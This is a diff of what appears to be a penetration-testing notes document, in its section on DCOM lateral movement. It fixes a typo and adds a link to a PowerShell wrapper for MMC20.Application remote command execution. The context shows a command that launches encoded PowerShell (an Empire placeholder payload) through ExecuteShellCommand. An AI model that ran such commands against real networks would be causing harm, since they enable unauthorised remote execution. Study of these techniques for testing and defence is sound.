@@ -1061,7 +1061,7 @@ As per the technet article `Windows Management Instrumentation <https://msdn.mic
 DCOM 
 ^^^^
 
-The below is as per my understanding (I might be wrong), if so, please do correct me. After reading `Lateral Movement Using the MMC20.Application COM Object <https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/>`_ and `Lateral Movement Via DCOM Round 2 <https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/>`_ I believer there are three ways to do lateral movement by using DCOM
+The below is as per my understanding (I might be wrong), if so, please do correct me. After reading `Lateral Movement Using the MMC20.Application COM Object <https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/>`_ and `Lateral Movement Via DCOM Round 2 <https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/>`_ I believe there are three ways to do lateral movement by using DCOM
 
 * DCOM applications via MMC Application Class (MMC20.Application) : This COM object allows you to script components of MMC snap-in operations. there is a method named “ExecuteShellCommand” under Document.ActiveView.
 
@@ -1072,6 +1072,8 @@ The below is as per my understanding (I might be wrong), if so, please do correc
 
   For Empire:
   $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")
+
+ Tanoy has written a simple wrapper/ function `Invoke-MMC20RCE.ps1 <https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1` which might be useful.
 
 * DCOM via ShellExecute
 
